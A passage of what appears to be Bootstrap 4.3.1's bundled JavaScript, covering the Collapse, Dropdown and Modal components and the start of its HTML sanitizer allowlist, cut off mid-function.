Util.getSelectorFromElement(element);        return selector ? document.querySelector(selector) : null;      };      Collapse._jQueryInterface = function _jQueryInterface(config) {        return this.each(function () {          var $this = $(this);          var data = $this.data(DATA_KEY$3);          var _config = _objectSpread({}, Default$1, $this.data(), typeof config === 'object' && config ? config : {});          if (!data && _config.toggle && /show|hide/.test(config)) {            _config.toggle = false;          }          if (!data) {            data = new Collapse(this, _config);            $this.data(DATA_KEY$3, data);          }          if (typeof config === 'string') {            if (typeof data[config] === 'undefined') {              throw new TypeError("No method named \"" + config + "\"");            }            data[config]();          }        });      };      _createClass(Collapse, null, [{        key: "VERSION",        get: function get() {          return VERSION$3;        }      }, {        key: "Default",        get: function get() {          return Default$1;        }      }]);      return Collapse;    }();  /**   * ------------------------------------------------------------------------   * Data Api implementation   * ------------------------------------------------------------------------   */  $(document).on(Event$3.CLICK_DATA_API, Selector$3.DATA_TOGGLE, function (event) {    // preventDefault only for <a> elements (which change the URL) not inside the collapsible element    if (event.currentTarget.tagName === 'A') {      event.preventDefault();    }    var $trigger = $(this);    var selector = Util.getSelectorFromElement(this);    var selectors = [].slice.call(document.querySelectorAll(selector));    $(selectors).each(function () {      var $target = $(this);      var data = $target.data(DATA_KEY$3);      var config = data ? 'toggle' : $trigger.data();      Collapse._jQueryInterface.call($target, config);    });  });  /**   * ------------------------------------------------------------------------   * jQuery   * ------------------------------------------------------------------------   */  $.fn[NAME$3] = Collapse._jQueryInterface;  $.fn[NAME$3].Constructor = Collapse;  $.fn[NAME$3].noConflict = function () {    $.fn[NAME$3] = JQUERY_NO_CONFLICT$3;    return Collapse._jQueryInterface;  };  /**   * ------------------------------------------------------------------------   * Constants   * ------------------------------------------------------------------------   */  var NAME$4 = 'dropdown';  var VERSION$4 = '4.3.1';  var DATA_KEY$4 = 'bs.dropdown';  var EVENT_KEY$4 = "." + DATA_KEY$4;  var DATA_API_KEY$4 = '.data-api';  var JQUERY_NO_CONFLICT$4 = $.fn[NAME$4];  var ESCAPE_KEYCODE = 27; // KeyboardEvent.which value for Escape (Esc) key  var SPACE_KEYCODE = 32; // KeyboardEvent.which value for space key  var TAB_KEYCODE = 9; // KeyboardEvent.which value for tab key  var ARROW_UP_KEYCODE = 38; // KeyboardEvent.which value for up arrow key  var ARROW_DOWN_KEYCODE = 40; // KeyboardEvent.which value for down arrow key  var RIGHT_MOUSE_BUTTON_WHICH = 3; // MouseEvent.which value for the right button (assuming a right-handed mouse)  var REGEXP_KEYDOWN = new RegExp(ARROW_UP_KEYCODE + "|" + ARROW_DOWN_KEYCODE + "|" + ESCAPE_KEYCODE);  var Event$4 = {    HIDE: "hide" + EVENT_KEY$4,    HIDDEN: "hidden" + EVENT_KEY$4,    SHOW: "show" + EVENT_KEY$4,    SHOWN: "shown" + EVENT_KEY$4,    CLICK: "click" + EVENT_KEY$4,    CLICK_DATA_API: "click" + EVENT_KEY$4 + DATA_API_KEY$4,    KEYDOWN_DATA_API: "keydown" + EVENT_KEY$4 + DATA_API_KEY$4,    KEYUP_DATA_API: "keyup" + EVENT_KEY$4 + DATA_API_KEY$4  };  var ClassName$4 = {    DISABLED: 'disabled',    SHOW: 'show',    DROPUP: 'dropup',    DROPRIGHT: 'dropright',    DROPLEFT: 'dropleft',    MENURIGHT: 'dropdown-menu-right',    MENULEFT: 'dropdown-menu-left',    POSITION_STATIC: 'position-static'  };  var Selector$4 = {    DATA_TOGGLE: '[data-toggle="dropdown"]',    FORM_CHILD: '.dropdown form',    MENU: '.dropdown-menu',    NAVBAR_NAV: '.navbar-nav',    VISIBLE_ITEMS: '.dropdown-menu .dropdown-item:not(.disabled):not(:disabled)'  };  var AttachmentMap = {    TOP: 'top-start',    TOPEND: 'top-end',    BOTTOM: 'bottom-start',    BOTTOMEND: 'bottom-end',    RIGHT: 'right-start',    RIGHTEND: 'right-end',    LEFT: 'left-start',    LEFTEND: 'left-end'  };  var Default$2 = {    offset: 0,    flip: true,    boundary: 'scrollParent',    reference: 'toggle',    display: 'dynamic'  };  var DefaultType$2 = {    offset: '(number|string|function)',    flip: 'boolean',    boundary: '(string|element)',    reference: '(string|element)',    display: 'string'    /**     * ------------------------------------------------------------------------     * Class Definition     * ------------------------------------------------------------------------     */  };  var Dropdown =    /*#__PURE__*/    function () {      function Dropdown(element, config) {        this._element = element;        this._popper = null;        this._config = this._getConfig(config);        this._menu = this._getMenuElement();        this._inNavbar = this._detectNavbar();        this._addEventListeners();      } // Getters      var _proto = Dropdown.prototype;      // Public      _proto.toggle = function toggle() {        if (this._element.disabled || $(this._element).hasClass(ClassName$4.DISABLED)) {          return;        }        var parent = Dropdown._getParentFromElement(this._element);        var isActive = $(this._menu).hasClass(ClassName$4.SHOW);        Dropdown._clearMenus();        if (isActive) {          return;        }        var relatedTarget = {          relatedTarget: this._element        };        var showEvent = $.Event(Event$4.SHOW, relatedTarget);        $(parent).trigger(showEvent);        if (showEvent.isDefaultPrevented()) {          return;        } // Disable totally Popper.js for Dropdown in Navbar        if (!this._inNavbar) {          /**           * Check for Popper dependency           * Popper - https://popper.js.org           */          if (typeof Popper === 'undefined') {            throw new TypeError('Bootstrap\'s dropdowns require Popper.js (https://popper.js.org/)');          }          var referenceElement = this._element;          if (this._config.reference === 'parent') {            referenceElement = parent;          } else if (Util.isElement(this._config.reference)) {            referenceElement = this._config.reference; // Check if it's jQuery element            if (typeof this._config.reference.jquery !== 'undefined') {              referenceElement = this._config.reference[0];            }          } // If boundary is not `scrollParent`, then set position to `static`          // to allow the menu to "escape" the scroll parent's boundaries          // https://github.com/twbs/bootstrap/issues/24251          if (this._config.boundary !== 'scrollParent') {            $(parent).addClass(ClassName$4.POSITION_STATIC);          }          this._popper = new Popper(referenceElement, this._menu, this._getPopperConfig());        } // If this is a touch-enabled device we add extra        // empty mouseover listeners to the body's immediate children;        // only needed because of broken event delegation on iOS        // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html        if ('ontouchstart' in document.documentElement && $(parent).closest(Selector$4.NAVBAR_NAV).length === 0) {          $(document.body).children().on('mouseover', null, $.noop);        }        this._element.focus();        this._element.setAttribute('aria-expanded', true);        $(this._menu).toggleClass(ClassName$4.SHOW);        $(parent).toggleClass(ClassName$4.SHOW).trigger($.Event(Event$4.SHOWN, relatedTarget));      };      _proto.show = function show() {        if (this._element.disabled || $(this._element).hasClass(ClassName$4.DISABLED) || $(this._menu).hasClass(ClassName$4.SHOW)) {          return;        }        var relatedTarget = {          relatedTarget: this._element        };        var showEvent = $.Event(Event$4.SHOW, relatedTarget);        var parent = Dropdown._getParentFromElement(this._element);        $(parent).trigger(showEvent);        if (showEvent.isDefaultPrevented()) {          return;        }        $(this._menu).toggleClass(ClassName$4.SHOW);        $(parent).toggleClass(ClassName$4.SHOW).trigger($.Event(Event$4.SHOWN, relatedTarget));      };      _proto.hide = function hide() {        if (this._element.disabled || $(this._element).hasClass(ClassName$4.DISABLED) || !$(this._menu).hasClass(ClassName$4.SHOW)) {          return;        }        var relatedTarget = {          relatedTarget: this._element        };        var hideEvent = $.Event(Event$4.HIDE, relatedTarget);        var parent = Dropdown._getParentFromElement(this._element);        $(parent).trigger(hideEvent);        if (hideEvent.isDefaultPrevented()) {          return;        }        $(this._menu).toggleClass(ClassName$4.SHOW);        $(parent).toggleClass(ClassName$4.SHOW).trigger($.Event(Event$4.HIDDEN, relatedTarget));      };      _proto.dispose = function dispose() {        $.removeData(this._element, DATA_KEY$4);        $(this._element).off(EVENT_KEY$4);        this._element = null;        this._menu = null;        if (this._popper !== null) {          this._popper.destroy();          this._popper = null;        }      };      _proto.update = function update() {        this._inNavbar = this._detectNavbar();        if (this._popper !== null) {          this._popper.scheduleUpdate();        }      } // Private        ;      _proto._addEventListeners = function _addEventListeners() {        var _this = this;        $(this._element).on(Event$4.CLICK, function (event) {          event.preventDefault();          event.stopPropagation();          _this.toggle();        });      };      _proto._getConfig = function _getConfig(config) {        config = _objectSpread({}, this.constructor.Default, $(this._element).data(), config);        Util.typeCheckConfig(NAME$4, config, this.constructor.DefaultType);        return config;      };      _proto._getMenuElement = function _getMenuElement() {        if (!this._menu) {          var parent = Dropdown._getParentFromElement(this._element);          if (parent) {            this._menu = parent.querySelector(Selector$4.MENU);          }        }        return this._menu;      };      _proto._getPlacement = function _getPlacement() {        var $parentDropdown = $(this._element.parentNode);        var placement = AttachmentMap.BOTTOM; // Handle dropup        if ($parentDropdown.hasClass(ClassName$4.DROPUP)) {          placement = AttachmentMap.TOP;          if ($(this._menu).hasClass(ClassName$4.MENURIGHT)) {            placement = AttachmentMap.TOPEND;          }        } else if ($parentDropdown.hasClass(ClassName$4.DROPRIGHT)) {          placement = AttachmentMap.RIGHT;        } else if ($parentDropdown.hasClass(ClassName$4.DROPLEFT)) {          placement = AttachmentMap.LEFT;        } else if ($(this._menu).hasClass(ClassName$4.MENURIGHT)) {          placement = AttachmentMap.BOTTOMEND;        }        return placement;      };      _proto._detectNavbar = function _detectNavbar() {        return $(this._element).closest('.navbar').length > 0;      };      _proto._getOffset = function _getOffset() {        var _this2 = this;        var offset = {};        if (typeof this._config.offset === 'function') {          offset.fn = function (data) {            data.offsets = _objectSpread({}, data.offsets, _this2._config.offset(data.offsets, _this2._element) || {});            return data;          };        } else {          offset.offset = this._config.offset;        }        return offset;      };      _proto._getPopperConfig = function _getPopperConfig() {        var popperConfig = {          placement: this._getPlacement(),          modifiers: {            offset: this._getOffset(),            flip: {              enabled: this._config.flip            },            preventOverflow: {              boundariesElement: this._config.boundary            }          } // Disable Popper.js if we have a static display        };        if (this._config.display === 'static') {          popperConfig.modifiers.applyStyle = {            enabled: false          };        }        return popperConfig;      } // Static        ;      Dropdown._jQueryInterface = function _jQueryInterface(config) {        return this.each(function () {          var data = $(this).data(DATA_KEY$4);          var _config = typeof config === 'object' ? config : null;          if (!data) {            data = new Dropdown(this, _config);            $(this).data(DATA_KEY$4, data);          }          if (typeof config === 'string') {            if (typeof data[config] === 'undefined') {              throw new TypeError("No method named \"" + config + "\"");            }            data[config]();          }        });      };      Dropdown._clearMenus = function _clearMenus(event) {        if (event && (event.which === RIGHT_MOUSE_BUTTON_WHICH || event.type === 'keyup' && event.which !== TAB_KEYCODE)) {          return;        }        var toggles = [].slice.call(document.querySelectorAll(Selector$4.DATA_TOGGLE));        for (var i = 0, len = toggles.length; i < len; i++) {          var parent = Dropdown._getParentFromElement(toggles[i]);          var context = $(toggles[i]).data(DATA_KEY$4);          var relatedTarget = {            relatedTarget: toggles[i]          };          if (event && event.type === 'click') {            relatedTarget.clickEvent = event;          }          if (!context) {            continue;          }          var dropdownMenu = context._menu;          if (!$(parent).hasClass(ClassName$4.SHOW)) {            continue;          }          if (event && (event.type === 'click' && /input|textarea/i.test(event.target.tagName) || event.type === 'keyup' && event.which === TAB_KEYCODE) && $.contains(parent, event.target)) {            continue;          }          var hideEvent = $.Event(Event$4.HIDE, relatedTarget);          $(parent).trigger(hideEvent);          if (hideEvent.isDefaultPrevented()) {            continue;          } // If this is a touch-enabled device we remove the extra          // empty mouseover listeners we added for iOS support          if ('ontouchstart' in document.documentElement) {            $(document.body).children().off('mouseover', null, $.noop);          }          toggles[i].setAttribute('aria-expanded', 'false');          $(dropdownMenu).removeClass(ClassName$4.SHOW);          $(parent).removeClass(ClassName$4.SHOW).trigger($.Event(Event$4.HIDDEN, relatedTarget));        }      };      Dropdown._getParentFromElement = function _getParentFromElement(element) {        var parent;        var selector = Util.getSelectorFromElement(element);        if (selector) {          parent = document.querySelector(selector);        }        return parent || element.parentNode;      } // eslint-disable-next-line complexity        ;      Dropdown._dataApiKeydownHandler = function _dataApiKeydownHandler(event) {        // If not input/textarea:        //  - And not a key in REGEXP_KEYDOWN => not a dropdown command        // If input/textarea:        //  - If space key => not a dropdown command        //  - If key is other than escape        //    - If key is not up or down => not a dropdown command        //    - If trigger inside the menu => not a dropdown command        if (/input|textarea/i.test(event.target.tagName) ? event.which === SPACE_KEYCODE || event.which !== ESCAPE_KEYCODE && (event.which !== ARROW_DOWN_KEYCODE && event.which !== ARROW_UP_KEYCODE || $(event.target).closest(Selector$4.MENU).length) : !REGEXP_KEYDOWN.test(event.which)) {          return;        }        event.preventDefault();        event.stopPropagation();        if (this.disabled || $(this).hasClass(ClassName$4.DISABLED)) {          return;        }        var parent = Dropdown._getParentFromElement(this);        var isActive = $(parent).hasClass(ClassName$4.SHOW);        if (!isActive || isActive && (event.which === ESCAPE_KEYCODE || event.which === SPACE_KEYCODE)) {          if (event.which === ESCAPE_KEYCODE) {            var toggle = parent.querySelector(Selector$4.DATA_TOGGLE);            $(toggle).trigger('focus');          }          $(this).trigger('click');          return;        }        var items = [].slice.call(parent.querySelectorAll(Selector$4.VISIBLE_ITEMS));        if (items.length === 0) {          return;        }        var index = items.indexOf(event.target);        if (event.which === ARROW_UP_KEYCODE && index > 0) {          // Up          index--;        }        if (event.which === ARROW_DOWN_KEYCODE && index < items.length - 1) {          // Down          index++;        }        if (index < 0) {          index = 0;        }        items[index].focus();      };      _createClass(Dropdown, null, [{        key: "VERSION",        get: function get() {          return VERSION$4;        }      }, {        key: "Default",        get: function get() {          return Default$2;        }      }, {        key: "DefaultType",        get: function get() {          return DefaultType$2;        }      }]);      return Dropdown;    }();  /**   * ------------------------------------------------------------------------   * Data Api implementation   * ------------------------------------------------------------------------   */  $(document).on(Event$4.KEYDOWN_DATA_API, Selector$4.DATA_TOGGLE, Dropdown._dataApiKeydownHandler).on(Event$4.KEYDOWN_DATA_API, Selector$4.MENU, Dropdown._dataApiKeydownHandler).on(Event$4.CLICK_DATA_API + " " + Event$4.KEYUP_DATA_API, Dropdown._clearMenus).on(Event$4.CLICK_DATA_API, Selector$4.DATA_TOGGLE, function (event) {    event.preventDefault();    event.stopPropagation();    Dropdown._jQueryInterface.call($(this), 'toggle');  }).on(Event$4.CLICK_DATA_API, Selector$4.FORM_CHILD, function (e) {    e.stopPropagation();  });  /**   * ------------------------------------------------------------------------   * jQuery   * ------------------------------------------------------------------------   */  $.fn[NAME$4] = Dropdown._jQueryInterface;  $.fn[NAME$4].Constructor = Dropdown;  $.fn[NAME$4].noConflict = function () {    $.fn[NAME$4] = JQUERY_NO_CONFLICT$4;    return Dropdown._jQueryInterface;  };  /**   * ------------------------------------------------------------------------   * Constants   * ------------------------------------------------------------------------   */  var NAME$5 = 'modal';  var VERSION$5 = '4.3.1';  var DATA_KEY$5 = 'bs.modal';  var EVENT_KEY$5 = "." + DATA_KEY$5;  var DATA_API_KEY$5 = '.data-api';  var JQUERY_NO_CONFLICT$5 = $.fn[NAME$5];  var ESCAPE_KEYCODE$1 = 27; // KeyboardEvent.which value for Escape (Esc) key  var Default$3 = {    backdrop: true,    keyboard: true,    focus: true,    show: true  };  var DefaultType$3 = {    backdrop: '(boolean|string)',    keyboard: 'boolean',    focus: 'boolean',    show: 'boolean'  };  var Event$5 = {    HIDE: "hide" + EVENT_KEY$5,    HIDDEN: "hidden" + EVENT_KEY$5,    SHOW: "show" + EVENT_KEY$5,    SHOWN: "shown" + EVENT_KEY$5,    FOCUSIN: "focusin" + EVENT_KEY$5,    RESIZE: "resize" + EVENT_KEY$5,    CLICK_DISMISS: "click.dismiss" + EVENT_KEY$5,    KEYDOWN_DISMISS: "keydown.dismiss" + EVENT_KEY$5,    MOUSEUP_DISMISS: "mouseup.dismiss" + EVENT_KEY$5,    MOUSEDOWN_DISMISS: "mousedown.dismiss" + EVENT_KEY$5,    CLICK_DATA_API: "click" + EVENT_KEY$5 + DATA_API_KEY$5  };  var ClassName$5 = {    SCROLLABLE: 'modal-dialog-scrollable',    SCROLLBAR_MEASURER: 'modal-scrollbar-measure',    BACKDROP: 'modal-backdrop',    OPEN: 'modal-open',    FADE: 'fade',    SHOW: 'show'  };  var Selector$5 = {    DIALOG: '.modal-dialog',    MODAL_BODY: '.modal-body',    DATA_TOGGLE: '[data-toggle="modal"]',    DATA_DISMISS: '[data-dismiss="modal"]',    FIXED_CONTENT: '.fixed-top, .fixed-bottom, .is-fixed, .sticky-top',    STICKY_CONTENT: '.sticky-top'    /**     * ------------------------------------------------------------------------     * Class Definition     * ------------------------------------------------------------------------     */  };  var Modal =    /*#__PURE__*/    function () {      function Modal(element, config) {        this._config = this._getConfig(config);        this._element = element;        this._dialog = element.querySelector(Selector$5.DIALOG);        this._backdrop = null;        this._isShown = false;        this._isBodyOverflowing = false;        this._ignoreBackdropClick = false;        this._isTransitioning = false;        this._scrollbarWidth = 0;      } // Getters      var _proto = Modal.prototype;      // Public      _proto.toggle = function toggle(relatedTarget) {        return this._isShown ? this.hide() : this.show(relatedTarget);      };      _proto.show = function show(relatedTarget) {        var _this = this;        if (this._isShown || this._isTransitioning) {          return;        }        if ($(this._element).hasClass(ClassName$5.FADE)) {          this._isTransitioning = true;        }        var showEvent = $.Event(Event$5.SHOW, {          relatedTarget: relatedTarget        });        $(this._element).trigger(showEvent);        if (this._isShown || showEvent.isDefaultPrevented()) {          return;        }        this._isShown = true;        this._checkScrollbar();        this._setScrollbar();        this._adjustDialog();        this._setEscapeEvent();        this._setResizeEvent();        $(this._element).on(Event$5.CLICK_DISMISS, Selector$5.DATA_DISMISS, function (event) {          return _this.hide(event);        });        $(this._dialog).on(Event$5.MOUSEDOWN_DISMISS, function () {          $(_this._element).one(Event$5.MOUSEUP_DISMISS, function (event) {            if ($(event.target).is(_this._element)) {              _this._ignoreBackdropClick = true;            }          });        });        this._showBackdrop(function () {          return _this._showElement(relatedTarget);        });      };      _proto.hide = function hide(event) {        var _this2 = this;        if (event) {          event.preventDefault();        }        if (!this._isShown || this._isTransitioning) {          return;        }        var hideEvent = $.Event(Event$5.HIDE);        $(this._element).trigger(hideEvent);        if (!this._isShown || hideEvent.isDefaultPrevented()) {          return;        }        this._isShown = false;        var transition = $(this._element).hasClass(ClassName$5.FADE);        if (transition) {          this._isTransitioning = true;        }        this._setEscapeEvent();        this._setResizeEvent();        $(document).off(Event$5.FOCUSIN);        $(this._element).removeClass(ClassName$5.SHOW);        $(this._element).off(Event$5.CLICK_DISMISS);        $(this._dialog).off(Event$5.MOUSEDOWN_DISMISS);        if (transition) {          var transitionDuration = Util.getTransitionDurationFromElement(this._element);          $(this._element).one(Util.TRANSITION_END, function (event) {            return _this2._hideModal(event);          }).emulateTransitionEnd(transitionDuration);        } else {          this._hideModal();        }      };      _proto.dispose = function dispose() {        [window, this._element, this._dialog].forEach(function (htmlElement) {          return $(htmlElement).off(EVENT_KEY$5);        });        /**         * `document` has 2 events `Event.FOCUSIN` and `Event.CLICK_DATA_API`         * Do not move `document` in `htmlElements` array         * It will remove `Event.CLICK_DATA_API` event that should remain         */        $(document).off(Event$5.FOCUSIN);        $.removeData(this._element, DATA_KEY$5);        this._config = null;        this._element = null;        this._dialog = null;        this._backdrop = null;        this._isShown = null;        this._isBodyOverflowing = null;        this._ignoreBackdropClick = null;        this._isTransitioning = null;        this._scrollbarWidth = null;      };      _proto.handleUpdate = function handleUpdate() {        this._adjustDialog();      } // Private        ;      _proto._getConfig = function _getConfig(config) {        config = _objectSpread({}, Default$3, config);        Util.typeCheckConfig(NAME$5, config, DefaultType$3);        return config;      };      _proto._showElement = function _showElement(relatedTarget) {        var _this3 = this;        var transition = $(this._element).hasClass(ClassName$5.FADE);        if (!this._element.parentNode || this._element.parentNode.nodeType !== Node.ELEMENT_NODE) {          // Don't move modal's DOM position          document.body.appendChild(this._element);        }        this._element.style.display = 'block';        this._element.removeAttribute('aria-hidden');        this._element.setAttribute('aria-modal', true);        if ($(this._dialog).hasClass(ClassName$5.SCROLLABLE)) {          this._dialog.querySelector(Selector$5.MODAL_BODY).scrollTop = 0;        } else {          this._element.scrollTop = 0;        }        if (transition) {          Util.reflow(this._element);        }        $(this._element).addClass(ClassName$5.SHOW);        if (this._config.focus) {          this._enforceFocus();        }        var shownEvent = $.Event(Event$5.SHOWN, {          relatedTarget: relatedTarget        });        var transitionComplete = function transitionComplete() {          if (_this3._config.focus) {            _this3._element.focus();          }          _this3._isTransitioning = false;          $(_this3._element).trigger(shownEvent);        };        if (transition) {          var transitionDuration = Util.getTransitionDurationFromElement(this._dialog);          $(this._dialog).one(Util.TRANSITION_END, transitionComplete).emulateTransitionEnd(transitionDuration);        } else {          transitionComplete();        }      };      _proto._enforceFocus = function _enforceFocus() {        var _this4 = this;        $(document).off(Event$5.FOCUSIN) // Guard against infinite focus loop          .on(Event$5.FOCUSIN, function (event) {            if (document !== event.target && _this4._element !== event.target && $(_this4._element).has(event.target).length === 0) {              _this4._element.focus();            }          });      };      _proto._setEscapeEvent = function _setEscapeEvent() {        var _this5 = this;        if (this._isShown && this._config.keyboard) {          $(this._element).on(Event$5.KEYDOWN_DISMISS, function (event) {            if (event.which === ESCAPE_KEYCODE$1) {              event.preventDefault();              _this5.hide();            }          });        } else if (!this._isShown) {          $(this._element).off(Event$5.KEYDOWN_DISMISS);        }      };      _proto._setResizeEvent = function _setResizeEvent() {        var _this6 = this;        if (this._isShown) {          $(window).on(Event$5.RESIZE, function (event) {            return _this6.handleUpdate(event);          });        } else {          $(window).off(Event$5.RESIZE);        }      };      _proto._hideModal = function _hideModal() {        var _this7 = this;        this._element.style.display = 'none';        this._element.setAttribute('aria-hidden', true);        this._element.removeAttribute('aria-modal');        this._isTransitioning = false;        this._showBackdrop(function () {          $(document.body).removeClass(ClassName$5.OPEN);          _this7._resetAdjustments();          _this7._resetScrollbar();          $(_this7._element).trigger(Event$5.HIDDEN);        });      };      _proto._removeBackdrop = function _removeBackdrop() {        if (this._backdrop) {          $(this._backdrop).remove();          this._backdrop = null;        }      };      _proto._showBackdrop = function _showBackdrop(callback) {        var _this8 = this;        var animate = $(this._element).hasClass(ClassName$5.FADE) ? ClassName$5.FADE : '';        if (this._isShown && this._config.backdrop) {          this._backdrop = document.createElement('div');          this._backdrop.className = ClassName$5.BACKDROP;          if (animate) {            this._backdrop.classList.add(animate);          }          $(this._backdrop).appendTo(document.body);          $(this._element).on(Event$5.CLICK_DISMISS, function (event) {            if (_this8._ignoreBackdropClick) {              _this8._ignoreBackdropClick = false;              return;            }            if (event.target !== event.currentTarget) {              return;            }            if (_this8._config.backdrop === 'static') {              _this8._element.focus();            } else {              _this8.hide();            }          });          if (animate) {            Util.reflow(this._backdrop);          }          $(this._backdrop).addClass(ClassName$5.SHOW);          if (!callback) {            return;          }          if (!animate) {            callback();            return;          }          var backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop);          $(this._backdrop).one(Util.TRANSITION_END, callback).emulateTransitionEnd(backdropTransitionDuration);        } else if (!this._isShown && this._backdrop) {          $(this._backdrop).removeClass(ClassName$5.SHOW);          var callbackRemove = function callbackRemove() {            _this8._removeBackdrop();            if (callback) {              callback();            }          };          if ($(this._element).hasClass(ClassName$5.FADE)) {            var _backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop);            $(this._backdrop).one(Util.TRANSITION_END, callbackRemove).emulateTransitionEnd(_backdropTransitionDuration);          } else {            callbackRemove();          }        } else if (callback) {          callback();        }      } // ----------------------------------------------------------------------        // the following methods are used to handle overflowing modals        // todo (fat): these should probably be refactored out of modal.js        // ----------------------------------------------------------------------        ;      _proto._adjustDialog = function _adjustDialog() {        var isModalOverflowing = this._element.scrollHeight > document.documentElement.clientHeight;        if (!this._isBodyOverflowing && isModalOverflowing) {          this._element.style.paddingLeft = this._scrollbarWidth + "px";        }        if (this._isBodyOverflowing && !isModalOverflowing) {          this._element.style.paddingRight = this._scrollbarWidth + "px";        }      };      _proto._resetAdjustments = function _resetAdjustments() {        this._element.style.paddingLeft = '';        this._element.style.paddingRight = '';      };      _proto._checkScrollbar = function _checkScrollbar() {        var rect = document.body.getBoundingClientRect();        this._isBodyOverflowing = rect.left + rect.right < window.innerWidth;        this._scrollbarWidth = this._getScrollbarWidth();      };      _proto._setScrollbar = function _setScrollbar() {        var _this9 = this;        if (this._isBodyOverflowing) {          // Note: DOMNode.style.paddingRight returns the actual value or '' if not set          //   while $(DOMNode).css('padding-right') returns the calculated value or 0 if not set          var fixedContent = [].slice.call(document.querySelectorAll(Selector$5.FIXED_CONTENT));          var stickyContent = [].slice.call(document.querySelectorAll(Selector$5.STICKY_CONTENT)); // Adjust fixed content padding          $(fixedContent).each(function (index, element) {            var actualPadding = element.style.paddingRight;            var calculatedPadding = $(element).css('padding-right');            $(element).data('padding-right', actualPadding).css('padding-right', parseFloat(calculatedPadding) + _this9._scrollbarWidth + "px");          }); // Adjust sticky content margin          $(stickyContent).each(function (index, element) {            var actualMargin = element.style.marginRight;            var calculatedMargin = $(element).css('margin-right');            $(element).data('margin-right', actualMargin).css('margin-right', parseFloat(calculatedMargin) - _this9._scrollbarWidth + "px");          }); // Adjust body padding          var actualPadding = document.body.style.paddingRight;          var calculatedPadding = $(document.body).css('padding-right');          $(document.body).data('padding-right', actualPadding).css('padding-right', parseFloat(calculatedPadding) + this._scrollbarWidth + "px");        }        $(document.body).addClass(ClassName$5.OPEN);      };      _proto._resetScrollbar = function _resetScrollbar() {        // Restore fixed content padding        var fixedContent = [].slice.call(document.querySelectorAll(Selector$5.FIXED_CONTENT));        $(fixedContent).each(function (index, element) {          var padding = $(element).data('padding-right');          $(element).removeData('padding-right');          element.style.paddingRight = padding ? padding : '';        }); // Restore sticky content        var elements = [].slice.call(document.querySelectorAll("" + Selector$5.STICKY_CONTENT));        $(elements).each(function (index, element) {          var margin = $(element).data('margin-right');          if (typeof margin !== 'undefined') {            $(element).css('margin-right', margin).removeData('margin-right');          }        }); // Restore body padding        var padding = $(document.body).data('padding-right');        $(document.body).removeData('padding-right');        document.body.style.paddingRight = padding ? padding : '';      };      _proto._getScrollbarWidth = function _getScrollbarWidth() {        // thx d.walsh        var scrollDiv = document.createElement('div');        scrollDiv.className = ClassName$5.SCROLLBAR_MEASURER;        document.body.appendChild(scrollDiv);        var scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;        document.body.removeChild(scrollDiv);        return scrollbarWidth;      } // Static        ;      Modal._jQueryInterface = function _jQueryInterface(config, relatedTarget) {        return this.each(function () {          var data = $(this).data(DATA_KEY$5);          var _config = _objectSpread({}, Default$3, $(this).data(), typeof config === 'object' && config ? config : {});          if (!data) {            data = new Modal(this, _config);            $(this).data(DATA_KEY$5, data);          }          if (typeof config === 'string') {            if (typeof data[config] === 'undefined') {              throw new TypeError("No method named \"" + config + "\"");            }            data[config](relatedTarget);          } else if (_config.show) {            data.show(relatedTarget);          }        });      };      _createClass(Modal, null, [{        key: "VERSION",        get: function get() {          return VERSION$5;        }      }, {        key: "Default",        get: function get() {          return Default$3;        }      }]);      return Modal;    }();  /**   * ------------------------------------------------------------------------   * Data Api implementation   * ------------------------------------------------------------------------   */  $(document).on(Event$5.CLICK_DATA_API, Selector$5.DATA_TOGGLE, function (event) {    var _this10 = this;    var target;    var selector = Util.getSelectorFromElement(this);    if (selector) {      target = document.querySelector(selector);    }    var config = $(target).data(DATA_KEY$5) ? 'toggle' : _objectSpread({}, $(target).data(), $(this).data());    if (this.tagName === 'A' || this.tagName === 'AREA') {      event.preventDefault();    }    var $target = $(target).one(Event$5.SHOW, function (showEvent) {      if (showEvent.isDefaultPrevented()) {        // Only register focus restorer if modal will actually get shown        return;      }      $target.one(Event$5.HIDDEN, function () {        if ($(_this10).is(':visible')) {          _this10.focus();        }      });    });    Modal._jQueryInterface.call($(target), config, this);  });  /**   * ------------------------------------------------------------------------   * jQuery   * ------------------------------------------------------------------------   */  $.fn[NAME$5] = Modal._jQueryInterface;  $.fn[NAME$5].Constructor = Modal;  $.fn[NAME$5].noConflict = function () {    $.fn[NAME$5] = JQUERY_NO_CONFLICT$5;    return Modal._jQueryInterface;  };  /**   * --------------------------------------------------------------------------   * Bootstrap (v4.3.1): tools/sanitizer.js   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)   * --------------------------------------------------------------------------   */  var uriAttrs = ['background', 'cite', 'href', 'itemtype', 'longdesc', 'poster', 'src', 'xlink:href'];  var ARIA_ATTRIBUTE_PATTERN = /^aria-[\w-]*$/i;  var DefaultWhitelist = {    // Global attributes allowed on any supplied element below.    '*': ['class', 'dir', 'id', 'lang', 'role', ARIA_ATTRIBUTE_PATTERN],    a: ['target', 'href', 'title', 'rel'],    area: [],    b: [],    br: [],    col: [],    code: [],    div: [],    em: [],    hr: [],    h1: [],    h2: [],    h3: [],    h4: [],    h5: [],    h6: [],    i: [],    img: ['src', 'alt', 'title', 'width', 'height'],    li: [],    ol: [],    p: [],    pre: [],    s: [],    small: [],    span: [],    sub: [],    sup: [],    strong: [],    u: [],    ul: []    /**     * A pattern that recognizes a commonly useful subset of URLs that are safe.     *     * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts     */  };  var SAFE_URL_PATTERN = /^(?:(?:https?|mailto|ftp|tel|file):|[^&:/?#]*(?:[/?#]|$))/gi;  /**   * A pattern that matches safe data URLs. Only matches image, video and audio types.   *   * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts   */  var DATA_URL_PATTERN = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[a-z0-9+/]+=*$/i;  function allowedAttribute(attr, allowedAttributeList) {    var attrName = attr.nodeName.toLowerCase();    if (allowedAttributeList.indexOf(attrName) !== -1) {      if (uriAttrs.indexOf(attrName) !== -1) {        return Boolean(attr.nodeValue.match(SAFE_URL_PATTERN) || attr.nodeValue.match(DATA_URL_PATTERN));      }      return true;    }    var regExp = allowedAttributeList.filter(function (attrRegex) {      return 